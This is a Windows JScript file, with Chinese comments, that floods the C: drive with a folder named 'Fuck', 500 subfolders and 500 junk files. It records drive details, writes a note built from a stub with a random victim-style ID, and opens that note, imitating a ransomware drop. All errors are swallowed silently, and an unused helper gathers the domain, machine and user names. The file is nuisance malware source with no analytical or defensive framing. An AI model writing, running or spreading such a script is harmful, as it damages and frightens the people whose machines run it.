var fso = new ActiveXObject("Scripting.FileSystemObject");
var WshNetwork = new ActiveXObject("WScript.Network");
/**
 * 随机生成字符串
 * @param lenth 指定生成字符串长度
 * @deprecated
 */
function randomString(length) {
    var str = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    var result = '';
    for (var i = length; i > 0; --i) {
        result += str[Math.floor(Math.random() * str.length)];
    }
    return result;
}
/**
 * 获取机器名，登录域及登录用户名
 * @deprecated
 */
function getusername() {
    var jkv = "Domain= " + WshNetwork.UserDomain() + "\nComputerName= " + WshNetwork.ComputerName + "\nUserName= " + WshNetwork.UserName;
    return jkv;
}
try {
    var a = fso.CreateFolder("c:\\Fuck");
    for (i = 0; i < 500; i++) {
        var floder = fso.CreateFolder("c:\\Fuck\\Fuck" + i);
        var file = fso.Createtextfile("c:\\Fuck\\" + i + ".fuck.sb360")
    }
    var drv, s = "";
    drv = fso.GetDrive(fso.GetDriveName("c:\\"));
    s += "Drive C:";
    s += drv.VolumeName + "\n";
    s += "Total Space: " + drv.TotalSize / 1024 / 1024;
    s += " Mb" + "\n";
    s += "Free Space: " + drv.FreeSpace / 1024 / 1024;
    s += " Mb" + "\n";
    var file2 = fso.Createtextfile("c:\\Fuck\\info.fuck.txt", true)
    // 填写数据
    file2.WriteLine("Testing");
    // 增加1个空行
    file2.WriteBlankLines(1);
    // 填写
    file2.Write(s);
    // 关闭文件
    file2.Close();
    // 删除
    //file2.Delete();
} catch (e) { /* eat any errors */ }
try {
    // 根据Stub生成并填写文件
    if (fso.FileExists("c:\\Fuck\\info.txt") == false) {
        var ForReading = 1;
        ts = fso.OpenTextFile("stub.txt", ForReading);
        s = ts.ReadAll(); // TODO: 解决中文乱码问题
        ts.Close();
        var file3 = fso.Createtextfile("c:\\Fuck\\info.txt", true)
        // 填写
        file3.Write(s);
        // 增加1个空行
        file3.WriteBlankLines(1);
        // 填写 ID
        file3.Write("id-" + randomString(16) + "-sb360");
        // 关闭文件
        file3.Close();
        var shell = WScript.CreateObject("WScript.Shell")
        shell.Run("c:\\Fuck\\info.txt")
    }
} catch (e) { /* eat any errors */ }